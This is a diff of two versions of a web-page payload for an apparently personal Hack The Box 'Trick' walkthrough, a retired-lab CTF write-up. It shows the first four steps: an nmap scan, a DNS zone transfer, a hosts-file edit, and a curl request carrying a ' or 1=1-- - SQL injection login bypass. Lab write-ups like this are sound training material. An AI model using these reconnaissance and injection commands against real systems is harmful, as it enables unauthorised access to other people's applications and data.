@@ -1,42 +1,40 @@
 1:"$Sreact.fragment"
 2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-62c612da01ccb422.js"],""]
 3:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-62c612da01ccb422.js"],"MobileNavigation"]
-19:I[484,[],"OutletBoundary"]
-1a:"$Sreact.suspense"
+18:I[484,[],"OutletBoundary"]
+19:"$Sreact.suspense"
 :HL["/writing/covers/hackthebox-trick-walkthrough.webp","image"]
-0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Trick Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box Trick machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T10:55:45.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[12," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-trick-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Trick machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Trick machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://app.hackthebox.com/machines/trick","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[[["$","nav",null,{"className":"article-toc article-toc-desktop","aria-label":"Article sections","children":[["$","span",null,{"children":"On this page"}],["$","ol",null,{"children":[["$","li","mindset-and-methodology-a-name-mindset-a",{"children":["$","a",null,{"href":"#mindset-and-methodology-a-name-mindset-a","children":"Mindset & Methodology <a name=\"mindset\"> </a>"}]}],["$","li","step-1-port-scanning-a-name-step-1-a",{"children":["$","a",null,{"href":"#step-1-port-scanning-a-name-step-1-a","children":"Step 1 — Port Scanning <a name=\"step-1\"> </a>"}]}],["$","li","step-2-dns-zone-transfer-a-name-step-2-a",{"children":["$","a",null,{"href":"#step-2-dns-zone-transfer-a-name-step-2-a","children":"Step 2 — DNS Zone Transfer <a name=\"step-2\"> </a>"}]}],["$","li","step-3-hosts-file-setup-a-name-step-3-a",{"children":["$","a",null,{"href":"#step-3-hosts-file-setup-a-name-step-3-a","children":"Step 3 — Hosts File Setup <a name=\"step-3\"> </a>"}]}],"$L4","$L5","$L6","$L7","$L8","$L9","$La","$Lb"]}]]}],"$Lc"],"$Ld","$Le",["$Lf","$L10","$L11"]]}],"$L12"]}]]}],"$L13"]}],"$L14","$L15"],null,"$L16"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"zs2c_HJI2CXWwLDIPVraL"}
-4:["$","li","step-4-sql-injection-auth-bypass-a-name-step-4-a",{"children":["$","a",null,{"href":"#step-4-sql-injection-auth-bypass-a-name-step-4-a","children":"Step 4 — SQL Injection Auth Bypass <a name=\"step-4\"> </a>"}]}]
-5:["$","li","step-5-subdomain-fuzzing-a-name-step-5-a",{"children":["$","a",null,{"href":"#step-5-subdomain-fuzzing-a-name-step-5-a","children":"Step 5 — Subdomain Fuzzing <a name=\"step-5\"> </a>"}]}]
-6:["$","li","step-6-lfi-discovery-and-exploitation-a-name-step-6-a",{"children":["$","a",null,{"href":"#step-6-lfi-discovery-and-exploitation-a-name-step-6-a","children":"Step 6 — LFI Discovery & Exploitation <a name=\"step-6\"> </a>"}]}]
-7:["$","li","step-7-reading-michael-s-ssh-key-a-name-step-7-a",{"children":["$","a",null,{"href":"#step-7-reading-michael-s-ssh-key-a-name-step-7-a","children":"Step 7 — Reading michael's SSH Key <a name=\"step-7\"> </a>"}]}]
-8:["$","li","step-8-ssh-access-and-user-flag-a-name-step-8-a",{"children":["$","a",null,{"href":"#step-8-ssh-access-and-user-flag-a-name-step-8-a","children":"Step 8 — SSH Access & User Flag <a name=\"step-8\"> </a>"}]}]
-9:["$","li","step-9-privilege-escalation-via-fail2ban-a-name-step-9-a",{"children":["$","a",null,{"href":"#step-9-privilege-escalation-via-fail2ban-a-name-step-9-a","children":"Step 9 — Privilege Escalation via fail2ban <a name=\"step-9\"> </a>"}]}]
-a:["$","li","root-flag-a-name-root-flag-a",{"children":["$","a",null,{"href":"#root-flag-a-name-root-flag-a","children":"Root Flag <a name=\"root-flag\"> </a>"}]}]
-b:["$","li","lessons-learned-a-name-lessons-a",{"children":["$","a",null,{"href":"#lessons-learned-a-name-lessons-a","children":"Lessons Learned <a name=\"lessons\"> </a>"}]}]
-c:["$","details",null,{"className":"article-toc article-toc-mobile","children":[["$","summary",null,{"children":["On this page · ",12," sections"]}],["$","nav",null,{"aria-label":"Article sections","children":["$","ol",null,{"children":[["$","li","mindset-and-methodology-a-name-mindset-a",{"children":["$","a",null,{"href":"#mindset-and-methodology-a-name-mindset-a","children":"Mindset & Methodology <a name=\"mindset\"> </a>"}]}],["$","li","step-1-port-scanning-a-name-step-1-a",{"children":["$","a",null,{"href":"#step-1-port-scanning-a-name-step-1-a","children":"Step 1 — Port Scanning <a name=\"step-1\"> </a>"}]}],["$","li","step-2-dns-zone-transfer-a-name-step-2-a",{"children":["$","a",null,{"href":"#step-2-dns-zone-transfer-a-name-step-2-a","children":"Step 2 — DNS Zone Transfer <a name=\"step-2\"> </a>"}]}],["$","li","step-3-hosts-file-setup-a-name-step-3-a",{"children":["$","a",null,{"href":"#step-3-hosts-file-setup-a-name-step-3-a","children":"Step 3 — Hosts File Setup <a name=\"step-3\"> </a>"}]}],["$","li","step-4-sql-injection-auth-bypass-a-name-step-4-a",{"children":["$","a",null,{"href":"#step-4-sql-injection-auth-bypass-a-name-step-4-a","children":"Step 4 — SQL Injection Auth Bypass <a name=\"step-4\"> </a>"}]}],["$","li","step-5-subdomain-fuzzing-a-name-step-5-a",{"children":["$","a",null,{"href":"#step-5-subdomain-fuzzing-a-name-step-5-a","children":"Step 5 — Subdomain Fuzzing <a name=\"step-5\"> </a>"}]}],["$","li","step-6-lfi-discovery-and-exploitation-a-name-step-6-a",{"children":["$","a",null,{"href":"#step-6-lfi-discovery-and-exploitation-a-name-step-6-a","children":"Step 6 — LFI Discovery & Exploitation <a name=\"step-6\"> </a>"}]}],["$","li","step-7-reading-michael-s-ssh-key-a-name-step-7-a",{"children":["$","a",null,{"href":"#step-7-reading-michael-s-ssh-key-a-name-step-7-a","children":"Step 7 — Reading michael's SSH Key <a name=\"step-7\"> </a>"}]}],["$","li","step-8-ssh-access-and-user-flag-a-name-step-8-a",{"children":["$","a",null,{"href":"#step-8-ssh-access-and-user-flag-a-name-step-8-a","children":"Step 8 — SSH Access & User Flag <a name=\"step-8\"> </a>"}]}],["$","li","step-9-privilege-escalation-via-fail2ban-a-name-step-9-a",{"children":["$","a",null,{"href":"#step-9-privilege-escalation-via-fail2ban-a-name-step-9-a","children":"Step 9 — Privilege Escalation via fail2ban <a name=\"step-9\"> </a>"}]}],["$","li","root-flag-a-name-root-flag-a",{"children":["$","a",null,{"href":"#root-flag-a-name-root-flag-a","children":"Root Flag <a name=\"root-flag\"> </a>"}]}],["$","li","lessons-learned-a-name-lessons-a",{"children":["$","a",null,{"href":"#lessons-learned-a-name-lessons-a","children":"Lessons Learned <a name=\"lessons\"> </a>"}]}]]}]}]]}]
-d:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/be86ff84b680dd5b698b50da6e8f38d6dc10b594/HTB-Trick.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep"," · be86ff84b680",""]}]]]}]
-e:["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Trick"," · Linux"," · Easy"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://app.hackthebox.com/machines/trick","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]
-f:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box Trick machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
-10:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
-11:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"4 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
-17:T5f13,
-<p><strong>Difficulty:</strong> Easy<br /><strong>OS:</strong> Linux<br /><strong>Attacker IP:</strong> 10.10.16.84<br /><strong>Target IP:</strong> 10.129.227.180  </p>
-<hr />
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Trick Walkthrough"}],["$","p",null,{"className":"article-dek","children":"A DNS zone transfer revealed the payroll site, SQL injection and an LFI bypass exposed Michael's SSH key, and his writable fail2ban action directory plus restart privilege replaced the ban command with a root-owned setuid shell."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T10:55:45.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[12," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-trick-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Trick machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Trick machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://app.hackthebox.com/machines/trick","target":"_blank","rel":"nofollow noopener noreferrer","children":"Hack The Box machine artwork"}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[[["$","nav",null,{"className":"article-toc article-toc-desktop","aria-label":"Article sections","children":[["$","span",null,{"children":"On this page"}],["$","ol",null,{"children":[["$","li","attack-chain",{"children":["$","a",null,{"href":"#attack-chain","children":"Attack chain"}]}],["$","li","step-1-port-scanning",{"children":["$","a",null,{"href":"#step-1-port-scanning","children":"Step 1: Port Scanning"}]}],["$","li","step-2-dns-zone-transfer",{"children":["$","a",null,{"href":"#step-2-dns-zone-transfer","children":"Step 2: DNS Zone Transfer"}]}],["$","li","step-3-hosts-file-setup",{"children":["$","a",null,{"href":"#step-3-hosts-file-setup","children":"Step 3: Hosts File Setup"}]}],["$","li","step-4-sql-injection-auth-bypass",{"children":["$","a",null,{"href":"#step-4-sql-injection-auth-bypass","children":"Step 4: SQL Injection Auth Bypass"}]}],["$","li","step-5-subdomain-fuzzing",{"children":"$L4"}],"$L5","$L6","$L7","$L8","$L9","$La"]}]]}],"$Lb"],"$Lc","$Ld",["$Le","$Lf","$L10"]]}],"$L11"]}]]}],"$L12"]}],"$L13","$L14"],null,"$L15"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"EBRi0HxexS1XMGpfUl_9d"}
+4:["$","a",null,{"href":"#step-5-subdomain-fuzzing","children":"Step 5: Subdomain Fuzzing"}]
+5:["$","li","step-6-lfi-discovery-and-exploitation",{"children":["$","a",null,{"href":"#step-6-lfi-discovery-and-exploitation","children":"Step 6: LFI Discovery & Exploitation"}]}]
+6:["$","li","step-7-reading-michael-s-ssh-key",{"children":["$","a",null,{"href":"#step-7-reading-michael-s-ssh-key","children":"Step 7: Reading michael's SSH Key"}]}]
+7:["$","li","step-8-ssh-access-and-user-flag",{"children":["$","a",null,{"href":"#step-8-ssh-access-and-user-flag","children":"Step 8: SSH Access & User Flag"}]}]
+8:["$","li","step-9-privilege-escalation-via-fail2ban",{"children":["$","a",null,{"href":"#step-9-privilege-escalation-via-fail2ban","children":"Step 9: Privilege Escalation via fail2ban"}]}]
+9:["$","li","root-flag",{"children":["$","a",null,{"href":"#root-flag","children":"Root Flag"}]}]
+a:["$","li","lessons-learned",{"children":["$","a",null,{"href":"#lessons-learned","children":"Lessons Learned"}]}]
+b:["$","details",null,{"className":"article-toc article-toc-mobile","children":[["$","summary",null,{"children":["On this page (",12," sections)"]}],["$","nav",null,{"aria-label":"Article sections","children":["$","ol",null,{"children":[["$","li","attack-chain",{"children":["$","a",null,{"href":"#attack-chain","children":"Attack chain"}]}],["$","li","step-1-port-scanning",{"children":["$","a",null,{"href":"#step-1-port-scanning","children":"Step 1: Port Scanning"}]}],["$","li","step-2-dns-zone-transfer",{"children":["$","a",null,{"href":"#step-2-dns-zone-transfer","children":"Step 2: DNS Zone Transfer"}]}],["$","li","step-3-hosts-file-setup",{"children":["$","a",null,{"href":"#step-3-hosts-file-setup","children":"Step 3: Hosts File Setup"}]}],["$","li","step-4-sql-injection-auth-bypass",{"children":["$","a",null,{"href":"#step-4-sql-injection-auth-bypass","children":"Step 4: SQL Injection Auth Bypass"}]}],["$","li","step-5-subdomain-fuzzing",{"children":["$","a",null,{"href":"#step-5-subdomain-fuzzing","children":"Step 5: Subdomain Fuzzing"}]}],["$","li","step-6-lfi-discovery-and-exploitation",{"children":["$","a",null,{"href":"#step-6-lfi-discovery-and-exploitation","children":"Step 6: LFI Discovery & Exploitation"}]}],["$","li","step-7-reading-michael-s-ssh-key",{"children":["$","a",null,{"href":"#step-7-reading-michael-s-ssh-key","children":"Step 7: Reading michael's SSH Key"}]}],["$","li","step-8-ssh-access-and-user-flag",{"children":["$","a",null,{"href":"#step-8-ssh-access-and-user-flag","children":"Step 8: SSH Access & User Flag"}]}],["$","li","step-9-privilege-escalation-via-fail2ban",{"children":["$","a",null,{"href":"#step-9-privilege-escalation-via-fail2ban","children":"Step 9: Privilege Escalation via fail2ban"}]}],["$","li","root-flag",{"children":["$","a",null,{"href":"#root-flag","children":"Root Flag"}]}],["$","li","lessons-learned",{"children":["$","a",null,{"href":"#lessons-learned","children":"Lessons Learned"}]}]]}]}]]}]
+c:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/be86ff84b680dd5b698b50da6e8f38d6dc10b594/HTB-Trick.md","target":"_blank","rel":"nofollow noopener noreferrer","children":"Immutable source revision"}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit be86ff84b680",""]}]]]}]
+d:["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Trick, Linux, Easy",". Retired status verified ","12 Jul 2026","."]}],["$","a",null,{"href":"https://app.hackthebox.com/machines/trick","target":"_blank","rel":"nofollow noopener noreferrer","children":"Open Hack The Box profile"}]]}]
+e:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box Trick machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
+f:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported from Abdullah Kareem's public preparation notes and lightly copy-edited for clarity. Commands and technical claims remain tied to the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+10:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"4 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
+16:T5401,<p><strong>Difficulty:</strong> Easy<br><strong>OS:</strong> Linux<br><strong>Attacker IP:</strong> 10.10.16.84<br><strong>Target IP:</strong> 10.129.227.180  </p>
+<hr>
 
 
 
-<h2 id="mindset-and-methodology-a-name-mindset-a">Mindset &amp; Methodology <pre class="raw-markup-example"><code>&lt;a name="mindset"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
-<p>Before touching the target, a good hacker follows a structured methodology:</p>
+<h2 id="attack-chain">Attack chain</h2>
+<p>Trick chains DNS discovery, SQL injection, LFI, SSH access, and fail2ban abuse.</p>
 <p><strong>Enumerate → Exploit → Escalate</strong></p>
-<p>Every action has a reason. You never blindly run tools — you ask:</p>
+<p>Every action has a reason. You never blindly run tools - you ask:</p>
 <ul>
 <li><em>What am I looking for?</em></li>
 <li><em>What does this tell me?</em></li>
 <li><em>What are my next options based on this information?</em></li>
 </ul>
-<p>This machine is a perfect example of <strong>chaining small vulnerabilities</strong> — no single step gives you root. You chain DNS info → SQLi → subdomain discovery → LFI → SSH key → fail2ban abuse. Each step unlocks the next.</p>
-<hr />
-<h2 id="step-1-port-scanning-a-name-step-1-a">Step 1 — Port Scanning <pre class="raw-markup-example"><code>&lt;a name="step-1"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
+<p>This machine is a clear example of <strong>chaining small vulnerabilities</strong> - no single step gives you root. You chain DNS info → SQLi → subdomain discovery → LFI → SSH key → fail2ban abuse. Each step unlocks the next.</p>
+<hr>
+<h2 id="step-1-port-scanning">Step 1: Port Scanning</h2>
 <h3 id="what-we-ran">What we ran</h3>
 <pre><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 10.129.227.180
 nmap -p 22,25,53,80 -sCV 10.129.227.180
@@ -47,83 +45,83 @@ nmap -p 22,25,53,80 -sCV 10.129.227.180
 53/tcp open  domain
 80/tcp open  http
 </code></pre>
-<h3 id="why-we-do-this">Why we do this</h3>
+
 <p>Port scanning is always the first step. You can't attack what you don't know exists. We use two nmap passes:</p>
 <ol>
-<li><strong><code>-p- --min-rate 10000</code></strong> — scan all 65535 ports quickly. Default nmap only scans the top 1000. Services on unusual ports get missed.</li>
-<li><strong><code>-sCV</code></strong> — on the discovered ports, run service detection (<code>-sV</code>) and default scripts (<code>-sC</code>) to get version info and basic enumeration.</li>
+<li><strong><code>-p- --min-rate 10000</code></strong> : scan all 65535 ports quickly. Default nmap only scans the top 1000. Services on unusual ports get missed.</li>
+<li><strong><code>-sCV</code></strong> : on the discovered ports, run service detection (<code>-sV</code>) and default scripts (<code>-sC</code>) to get version info and basic enumeration.</li>
 </ol>
-<h3 id="hacker-mindset">Hacker mindset</h3>
-<p>Look at what's <em>unusual</em>. Every machine has SSH (22) and HTTP (80) — that's expected. But <strong>port 25 (SMTP)</strong> and <strong>port 53 (DNS)</strong> stand out on what appears to be a web server. Ask yourself: <em>why would a web server be running a mail server and a DNS server?</em> These are your attack surface hints. Always note unusual services — they almost always matter.</p>
-<hr />
-<h2 id="step-2-dns-zone-transfer-a-name-step-2-a">Step 2 — DNS Zone Transfer <pre class="raw-markup-example"><code>&lt;a name="step-2"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
+
+<p>Look at what's <em>unusual</em>. Every machine has SSH (22) and HTTP (80) - that's expected. But <strong>port 25 (SMTP)</strong> and <strong>port 53 (DNS)</strong> stand out on what appears to be a web server. Ask yourself: <em>why would a web server be running a mail server and a DNS server?</em> These are your attack surface hints. Always note unusual services - they almost always matter.</p>
+<hr>
+<h2 id="step-2-dns-zone-transfer">Step 2: DNS Zone Transfer</h2>
 <h3 id="what-we-ran-2">What we ran</h3>
 <pre><code class="language-bash" data-language="bash">dig axfr trick.htb @10.129.227.180
 </code></pre>
 <h3 id="results-2">Results</h3>
 <pre><code>preprod-payroll.trick.htb.  604800  IN  CNAME  trick.htb.
 </code></pre>
-<h3 id="why-we-do-this-2">Why we do this</h3>
+
 <p>DNS on port 53 is interesting because DNS servers store a map of all hostnames for a domain. A <strong>zone transfer (AXFR)</strong> is a legitimate DNS feature designed to let secondary DNS servers sync records from a primary server. When misconfigured (no IP restrictions), anyone can request a full dump of all DNS records.</p>
 <p>The <code>dig axfr</code> command asks the DNS server at 10.129.227.180 to give us all records for the <code>trick.htb</code> zone.</p>
 <h3 id="what-this-reveals">What this reveals</h3>
-<p>The zone transfer reveals <code>preprod-payroll.trick.htb</code> — a subdomain that wouldn't appear in a normal port scan or web crawl. This is a <strong>virtual host</strong> — the same IP serves different content depending on what <code>Host:</code> header you send in your HTTP request.</p>
-<h3 id="hacker-mindset-2">Hacker mindset</h3>
-<p>DNS is a gold mine for reconnaissance. Before zone transfers were locked down, attackers could map entire corporate networks just by asking DNS servers. Even today, misconfigured DNS on CTF machines (and real targets) leaks internal hostnames, development environments, staging servers, and admin panels. Always check DNS when port 53 is open.</p>
-<hr />
-<h2 id="step-3-hosts-file-setup-a-name-step-3-a">Step 3 — Hosts File Setup <pre class="raw-markup-example"><code>&lt;a name="step-3"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
+<p>The zone transfer reveals <code>preprod-payroll.trick.htb</code> - a subdomain that wouldn't appear in a normal port scan or web crawl. This is a <strong>virtual host</strong> - the same IP serves different content depending on what <code>Host:</code> header you send in your HTTP request.</p>
+
+<p>DNS is a useful source for reconnaissance. Before zone transfers were locked down, attackers could map entire corporate networks just by asking DNS servers. Even today, misconfigured DNS on CTF machines (and real targets) leaks internal hostnames, development environments, staging servers, and admin panels. Always check DNS when port 53 is open.</p>
+<hr>
+<h2 id="step-3-hosts-file-setup">Step 3: Hosts File Setup</h2>
 <h3 id="what-we-ran-3">What we ran</h3>
 <pre><code class="language-bash" data-language="bash">echo "10.129.227.180 trick.htb preprod-payroll.trick.htb" | sudo tee -a /etc/hosts
 </code></pre>
-<h3 id="why-we-do-this-3">Why we do this</h3>
-<p>Virtual hosting means the web server uses the HTTP <code>Host:</code> header to decide which site to serve. Your browser normally resolves hostnames through DNS, but this is an HTB machine — its DNS isn't on the public internet.</p>
+
+<p>Virtual hosting means the web server uses the HTTP <code>Host:</code> header to decide which site to serve. Your browser normally resolves hostnames through DNS, but this is an HTB machine - its DNS isn't on the public internet.</p>
 <p>By adding entries to <code>/etc/hosts</code>, we force our machine to resolve these hostnames to the target IP without needing public DNS. This is essential for accessing virtual hosts.</p>
-<h3 id="hacker-mindset-3">Hacker mindset</h3>
+
 <p>Every subdomain you discover needs to go into <code>/etc/hosts</code> immediately. If you skip this and try to browse directly, you'll get the default site or a 404. Always keep your hosts file updated as you discover new subdomains throughout the engagement.</p>
-<hr />
-<h2 id="step-4-sql-injection-auth-bypass-a-name-step-4-a">Step 4 — SQL Injection Auth Bypass <pre class="raw-markup-example"><code>&lt;a name="step-4"&gt;</code></pre><pre class="raw-markup-example"><code>&lt;/a&gt;</code></pre></h2>
+<hr>
+<h2 id="step-4-sql-injection-auth-bypass">Step 4: SQL Injection Auth Bypass</h2>
 <h3 id="what-we-found">What we found</h3>
-<p>Browsing to <code>http://preprod-payroll.trick.htb</code> reveals an "Employee's Payroll Management System" login form. This is real, publicly available software — a quick Google of the title confirms it.</p>
+<p>Browsing to <code>http://preprod-payroll.trick.htb</code> reveals an "Employee's Payroll Management System" login form. This is real, publicly available software - a quick Google of the title confirms it.</p>
 <h3 id="what-we-ran-4">What we ran</h3>
 <pre><code class="language-bash" data-language="bash">curl -s -c cookies.txt -b cookies.txt -X POST \
   "http://preprod-payroll.trick.htb/ajax.php?action=login" \
-  -d "username=' or 1=1-- -&amp;password=REDACTED
+  -d "username=' or 1=1-- -&amp;password=REDACTED"
 </code></pre>
 <h3 id="result-1-login-successful">Result: <code>1</code> (login successful)</h3>
-<h3 id="why-this-works">Why this works</h3>
+
 <p>The backend SQL query looks something like this:</p>
-<pre><code class="language-sql" data-language="sql">SELECT * FROM users WHERE username = '[input]' AND password = REDACTED;
+<pre><code class="language-sql" data-language="sql">SELECT * FROM users WHERE username = '[input]' AND password = 'REDACTED';
 </code></pre>
 <p>When we inject <code>' or 1=1-- -</code> as the username, the query becomes:</p>
-<pre><code class="language-sql" data-language="sql">SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = REDACTED;
+<pre><code class="language-sql" data-language="sql">SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = 'REDACTED';
 </code></pre>
 <p>The <code>-- -</code> comments out the rest of the query. <code>OR 1=1</code> is always true, so the query returns all users. The application sees a successful login and grants admin access.</p>
 <h3 id="why-we-tried-this">Why we tried this</h3>
 <p>The login form is the natural entry point. Any time you see a login form backed by a database (and PHP/MySQL is extremely common), SQL injection should be your first test. A single quote <code>'</code> in the username field breaking the page is often the first indicator.</p>
-<h3 id="hacker-mindset-4">Hacker mindset</h3>
-<p>SQL injection auth bypasses are one of the oldest and most reliable attacks. The pattern <code>' or 1=1-- -</code> is a classic. Real software downloaded from the internet (like this Payroll Management System) is frequently vulnerable because developers prioritize features over security. When you identify off-the-shelf software, also search for CVEs — this specific bypass is <strong>CVE-2022-28468</strong>.</p>
-<hr />
